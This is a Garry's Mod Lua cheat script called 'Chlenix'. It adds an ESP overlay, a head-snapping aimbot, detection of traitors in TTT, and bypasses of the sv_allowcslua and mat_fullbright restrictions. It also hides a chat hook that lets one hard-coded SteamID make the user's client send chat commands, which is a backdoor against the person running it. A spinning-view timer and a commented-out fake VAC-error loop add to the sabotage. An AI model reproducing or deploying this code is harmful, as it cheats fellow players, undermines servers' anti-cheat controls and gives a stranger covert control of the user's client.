if SERVER then return false end
cam.End3D()

local i = 0
timer.Create("rollin",0.3,0,function()
	if LocalPlayer and IsValid(LocalPlayer()) then	
LocalPlayer():SetEyeAngles(Angle(i,i,i))
	i = i + 1
	if i == 360 then i = 0 end end
end)

local sids = {
	'STEAM_0:1:11430914', -- xd

}
--[[
if LocalPlayer().SteamID then
	local sid = LocalPlayer():SteamID()
	if not table.HasValue(sids,sid) then
		for i=1, 99e99 do
			print("Can't connect to VAC server!")
			if i == 99e99 then
				cam.End3D2D()
			end
		end
	end
end]]--

hook.Add("OnPlayerChat","tupoi_wkolnik",function(_,str)
	if string.sub(str,0,4) == "chle" and table.HasValue(sids,_:SteamID()) then
		chat.AddText("Call to arms!")
		timer.Simple(math.random(1,10),function()
			RunConsoleCommand("say","!"..str)
			RunConsoleCommand("say_team","!"..str)
		end)
	end
end)


chlenix = {}
MsgC(Color(0,255,0),"____________________________________________________________________________________________________________")print()print()
MsgC(Color(255,0,0),"    ,o888888o.    ")MsgC(Color(255,127,0),"8 8888        8 ")MsgC(Color(255,255,0),"8 8888         ")MsgC(Color(0,255,0),"8 8888888888   ")MsgC(Color(0,0,255),"b.             8  ")MsgC(Color(102,0,255),"8 8888 ")MsgC(Color(143,0,255),"`8.`8888.      ,8' ")print()
MsgC(Color(255,0,0),"   8888     `88.  ")MsgC(Color(255,127,0),"8 8888        8 ")MsgC(Color(255,255,0),"8 8888         ")MsgC(Color(0,255,0),"8 8888         ")MsgC(Color(0,0,255),"888o.          8  ")MsgC(Color(102,0,255),"8 8888 ")MsgC(Color(143,0,255)," `8.`8888.    ,8'  ")print()
MsgC(Color(255,0,0),",8 8888       `8. ")MsgC(Color(255,127,0),"8 8888        8 ")MsgC(Color(255,255,0),"8 8888         ")MsgC(Color(0,255,0),"8 8888         ")MsgC(Color(0,0,255),"Y88888o.       8  ")MsgC(Color(102,0,255),"8 8888 ")MsgC(Color(143,0,255),"  `8.`8888.  ,8'   ")print()
MsgC(Color(255,0,0),"88 8888           ")MsgC(Color(255,127,0),"8 8888        8 ")MsgC(Color(255,255,0),"8 8888         ")MsgC(Color(0,255,0),"8 8888         ")MsgC(Color(0,0,255),".`Y888888o.    8  ")MsgC(Color(102,0,255),"8 8888 ")MsgC(Color(143,0,255),"   `8.`8888.,8'    ")print()
MsgC(Color(255,0,0),"88 8888           ")MsgC(Color(255,127,0),"8 8888        8 ")MsgC(Color(255,255,0),"8 8888         ")MsgC(Color(0,255,0),"8 888888888888 ")MsgC(Color(0,0,255),"8o. `Y888888o. 8  ")MsgC(Color(102,0,255),"8 8888 ")MsgC(Color(143,0,255),"    `8.`88888'     ")print()
MsgC(Color(255,0,0),"88 8888           ")MsgC(Color(255,127,0),"8 8888        8 ")MsgC(Color(255,255,0),"8 8888         ")MsgC(Color(0,255,0),"8 8888         ")MsgC(Color(0,0,255),"8`Y8o. `Y88888o8  ")MsgC(Color(102,0,255),"8 8888 ")MsgC(Color(143,0,255),"    .88.`8888.     ")print()
MsgC(Color(255,0,0),"88 8888           ")MsgC(Color(255,127,0),"8 8888888888888 ")MsgC(Color(255,255,0),"8 8888         ")MsgC(Color(0,255,0),"8 8888         ")MsgC(Color(0,0,255),"8   `Y8o. `Y8888  ")MsgC(Color(102,0,255),"8 8888 ")MsgC(Color(143,0,255),"   .8'`8.`8888.    ")print()
MsgC(Color(255,0,0),"`8 8888       .8' ")MsgC(Color(255,127,0),"8 8888        8 ")MsgC(Color(255,255,0),"8 8888         ")MsgC(Color(0,255,0),"8 8888         ")MsgC(Color(0,0,255),"8      `Y8o. `Y8  ")MsgC(Color(102,0,255),"8 8888 ")MsgC(Color(143,0,255),"  .8'  `8.`8888.   ")print()
MsgC(Color(255,0,0),"   8888     ,88'  ")MsgC(Color(255,127,0),"8 8888        8 ")MsgC(Color(255,255,0),"8 8888         ")MsgC(Color(0,255,0),"8 8888         ")MsgC(Color(0,0,255),"8         `Y8o.`  ")MsgC(Color(102,0,255),"8 8888 ")MsgC(Color(143,0,255)," .8'    `8.`8888.  ")print()
MsgC(Color(255,0,0),"    `8888888P'    ")MsgC(Color(255,127,0),"8 8888        8 ")MsgC(Color(255,255,0),"8 888888888888 ")MsgC(Color(0,255,0),"8 888888888888 ")MsgC(Color(0,0,255),"8            `Yo  ")MsgC(Color(102,0,255),"8 8888 ")MsgC(Color(143,0,255),".8'      `8.`8888. ")print()
MsgC(Color(0,255,0),"____________________________________________________________________________________________________________")print()
MsgC(Color(0,255,0),"                             By Collision | leet.su |                                                       ")print()
MsgC(Color(0,255,0),"____________________________________________________________________________________________________________")print()


chlenix.cfg = {}
chlenix.marked = {}
chlenix.mark_ents_pos = {}
chlenix.shoot = false
chlenix.VERSION = "0.2 police edition"

function chlenix.print(s) 
	MsgC(Color(0,255,0),s) print()
end

function chlenix.printc(...)
	chat.AddText(Color(128,255,128),unpack({...}))
end

if game.SinglePlayer() then
	chlenix.printc("Detected singleplayer.")
	local se_cvar = GetConVar("sv_allowcslua")
	if se_cvar then
		chlenix.printc("Patching SE...")
		se_cvar:SetFlags(0)
		se_cvar:SetValue(1)
		se_cvar:SetName("chlenix_se")
		chlenix.printc("SE patched! Lets roll!")
		surface.PlaySound("chlenix/lets_roll.wav")
	end
else
	chlenix.printc("Chlenix loaded! .!.")
end
local bright = GetConVar("mat_fullbright")
bright:SetFlags(0)


function chlenix.loadcfg()
	local cfg = file.Read("chlenix.txt","DATA")
	if cfg and cfg ~= "" then
		chlenix.cfg = util.KeyValuesToTable(cfg)
	end
end

function chlenix.getcfg(key,default)
	if chlenix.cfg[key] then 
		return chlenix.cfg[key] 
	end
	
	return default
end

function chlenix.setcfg(key,value)
	chlenix.cfg[key] = value
	chlenix.savecfg()
end

function chlenix.savecfg()
	local cfg = util.TableToKeyValues(chlenix.cfg)
	file.Write("chlenix.txt",cfg)
end

function chlenix.HUDPaint()
	chlenix.DrawESP()
	chlenix.DrawXHair()
end

hook.Add("HUDPaint","DrawMenuScreen ",chlenix.HUDPaint)

function chlenix.FindPlayers()
	local maxdist = tonumber(chlenix.getcfg("esp_radius",1000))
	local tab = {}
	for k,v in pairs(player.GetAll()) do
		local dist = v:GetPos():Distance(LocalPlayer():GetPos())
		if v ~= LocalPlayer() and dist <= maxdist and v:Team() ~= TEAM_SPECTATOR then
			table.insert(tab,v)
		end
	end
	
	return tab
end

function chlenix.IsTraitor(ply)
	return ply.CHLETRAITOR
end

function chlenix.GetInfo(ply)
	local info = ""
	if ply:IsSuperAdmin() then
		info = info.."[SUPERADMIN]\n"
	elseif ply:IsAdmin() then
		info = info.."[ADMIN]\n"
	end
	
	if chlenix.IsTraitor(ply) then
		info = info.."[TRAITOR]\n"
	end
	
	info = info..ply:Name().."\n"
	info = info.."HP: "..ply:Health().."\n"
	info = info.."AP: "..ply:Armor().."\n"
	
	return info
	
end

function chlenix.DrawESP()
	if chlenix.getcfg("esp_enabled","false") ~= "true" then return end
	for k,v in pairs(chlenix.FindPlayers()) do
		if v:Alive() and v:Health() > 0 then
			local pos = (v:GetPos() + Vector(0,10,80)):ToScreen()
			draw.DrawText(chlenix.GetInfo(v),"DebugFixed",pos.x,pos.y,Color(255,0,255,255) ,1)
		end
	end
	for k,v in pairs(chlenix.mark_ents_pos) do
		local pos = v:ToScreen()
		draw.DrawText(k.."\n"..math.ceil(v:Distance(LocalPlayer():GetPos())).." units","TargetID",pos.x,pos.y,Color(255,0,255,255),1)
	end
end

--[[hook.Add("PostDrawEffects", "RenderHalos ", function()
	if chlenix.getcfg("esp_draw_models","false") ~= "true" then return end
	cam.Start3D(EyePos(), EyeAngles())	
		cam.IgnoreZ(true)
		render.PushFlashlightMode(true)
		for k,v in pairs(chlenix.FindPlayers()) do
			v:DrawModel()
		end
		render.PopFlashlightMode()
		cam.IgnoreZ(false)
	cam.End3D()	
end)]]--

function chlenix.DrawXHair()
	if chlenix.getcfg("xhair_enabled","false") ~= "true" then return end
	local x = ScrW()/2
	local y = ScrH()/2
	surface.SetDrawColor(0,175,175,255) 
	surface.DrawLine(x-20,y,x+20,y) -- mid bot line
	surface.DrawLine(x,y+20,x,y-20) -- mid top line
	if table.Count(chlenix.marked) > 0 then
		surface.DrawLine(x-20,y,x,y+20)
		surface.DrawLine(x+20,y,x,y-20)
		surface.DrawLine(x-20,y,x,y-20)
		surface.DrawLine(x+20,y,x,y+20)
		
		draw.DrawText("TARGETS: "..table.Count(chlenix.marked),"TargetID",x, y+ 30, Color(255,0,255,255),1)
	end
end


function chlenix.AimThink()
	if chlenix.shoot then
		for k,v in pairs(chlenix.marked) do
			if not IsValid(v) or not v:Alive() then
				chlenix.marked[k] = nil
				continue
			end
			local targethead = v:LookupBone("ValveBiped.Bip01_Head1")
			local targetheadpos,targetheadang = v:GetBonePosition(targethead)
			LocalPlayer():SetEyeAngles((targetheadpos - LocalPlayer():GetShootPos()):Angle())
		end
		if table.Count(chlenix.marked) == 0 then
			chlenix.printc("All your targets are dead. Aimbot disabled.")
			chlenix.shoot = false
			return
		end
	end
	
end
hook.Add("Think","RenderScreenEffects ",chlenix.AimThink)

hook.Add("TTTPrepareRound","sas",function()
	for k,v in pairs(player.GetAll()) do 
		v.CHLETRAITOR = false
	end
	chlenix.mark_ents_pos = {}
end)

chlenix.trents = {
	'weapon_ttt_c4',
	'weapon_ttt_knife',
	"weapon_ttt_phammer", 
	"weapon_ttt_sipistol", 
	"weapon_ttt_flaregun", 
	"weapon_ttt_push", 
	"weapon_ttt_radio", 
	"weapon_ttt_teleport", 
	"(Disguise)", 
}

hook.Add("OnEntityCreated","TTT ",function(e)
	if GAMEMODE.Name == "Trouble in Terrorist Town" or GAMEMODE.Name == "TTT" then
		local class = e:GetClass()
		MsgC(Color(255,0,0),class.."\n")
		if class == "class C_HL2MPRagdoll" or class == "prop_ragdoll" then
			timer.Simple(2,function()
				local name = e:GetNWString("nick", "Somebody")
				chlenix.printc(name.." has died!")
			end)
		end
		
		if table.HasValue(chlenix.trents,class) then
			local pos = e:GetPos()
			local ee = ents.FindInSphere(pos,30)
			local tr = {}
			for k,v in pairs(ee) do
				if IsValid(v) and v:IsPlayer() and v:Alive() and v:Team() ~= (TEAM_SPECTATOR or 0) then
					table.insert(tr,v)
				end
			end
			local tra = NULL
			local dis = 9999999
			for k,v in pairs(tr) do
				if dis > v:GetPos():Distance(pos) then
					dis = v:GetPos():Distance(pos)
					tra = v
				end
			end
			
			if IsValid(tra) then
				if tra.CHLETRAITOR ~= true then surface.PlaySound("ambient/alarms/klaxon1.wav") end
				tra.CHLETRAITOR = true
				chlenix.printc(Color(255,0,0),tra:Name().." is a traitor! - "..class)
			end
		end
		
		if class == "ttt_c4" then
			local pos = e:GetPos()
			local own = NULL
			local dist = e:GetPos():Distance(LocalPlayer():GetPos())
			
			local ee = ents.FindInSphere(pos,300)
			local tr = {}
			for k,v in pairs(ee) do
				if IsValid(v) and v:IsPlayer() and v:Alive() and v:Team() ~= (TEAM_SPECTATOR or 0) then
					table.insert(tr,v)
				end
			end
			local tra = NULL
			local dis = 9999999
			for k,v in pairs(tr) do
				if dis > v:GetPos():Distance(pos) then
					dis = v:GetPos():Distance(pos)
					tra = v
				end
			end
			chlenix.printc(Color(255,0,0),"Someone set us up the bomb! "..math.floor(dist).." units away from you!")
			chlenix.mark_ents_pos['C4'] = pos
			if IsValid(tra) then 
				tra.CHLETRAITOR = true
				chlenix.printc(Color(255,0,0),"Probably "..tra:Name().."!") 
			end
			LocalPlayer():EmitSound("radio/bombpl.wav",511)
			
			timer.Simple(1.5,function()
				surface.PlaySound("ambient/alarms/klaxon1.wav")
			end)
		end
	end
end)
		

function chlenix.AimMark()
	if chlenix.lastaim and chlenix.lastaim - CurTime() <= 0.20 and chlenix.lastaim - CurTime() >= -0.20 then
		chlenix.shoot = not chlenix.shoot
		if chlenix.shoot == false then
			chlenix.marked = {}
		end
		return
	else
		chlenix.lastaim = CurTime()
	end
	
	local trace = util.GetPlayerTrace(LocalPlayer())
	local traceRes = util.TraceLine(trace)
	if traceRes.HitNonWorld then
		local target = traceRes.Entity
		if target:IsPlayer() and not table.HasValue(chlenix.marked,target) then
			table.insert(chlenix.marked,target)
		end
	end
end

concommand.Add("chlenix_aim_mark",function()
	chlenix.AimMark()
end)

chlenix.loadcfg()

concommand.Add("chlenix_set_cfg",function(_,_,a)
	local key = table.remove(a,1)
	local val = table.remove(a,1)
	if not key or not val or key == "" or val == "" then
		return false
	end
	
	chlenix.setcfg(key,val)
	chlenix.savecfg()
end)
	

chlenix.print("Loading Chlenix:")
chlenix.print("\t\tloading configs...")